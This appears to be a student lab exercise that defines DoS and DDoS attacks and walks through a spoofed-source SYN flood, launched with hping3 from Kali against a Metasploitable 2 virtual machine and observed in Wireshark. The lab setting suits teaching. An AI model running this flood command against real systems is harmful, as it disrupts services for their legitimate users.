Write a code to demonstrate DoS attacks.
DoS Attack : - It is a Cyber attack where perpetrator seeks to make a machine or network resource unavailable to its intented users by temporarily or indefinitely disrupting services of a host connected to the network. It is an attack used to deny legitimate users access to a resource such as accessing a website, emails etc or making it extremely slow. There is one source and 1 target system.
DoS is accomplished by flooding the target system with many request to overload it and prevent some of the legitimate requests from being fulfilled.
DDoS attack: - There are many systems which send the requests to single target system.Multiple systems flood the available bandwith. Such an attack is the result of multiple compromised systems for eg. Botnet.

Next we launch the DoS attack using hping3 as follows
1.	Open One terminal in Kali and enter root login 
>>sudo su
Enter kali password
2.	From root console type the command in the following way
>>hping3 –S 192.168.56.101(metasploitable 2 IP address) –a 192.168.56.200 (Our spoofed IP address) –p 80(open port) - - flood
{It will launch the synflood on the metasplotable 2 machine)
3.	We can observe the traffic in wireshark.  We can see traffic grows enormously after this command is executed.
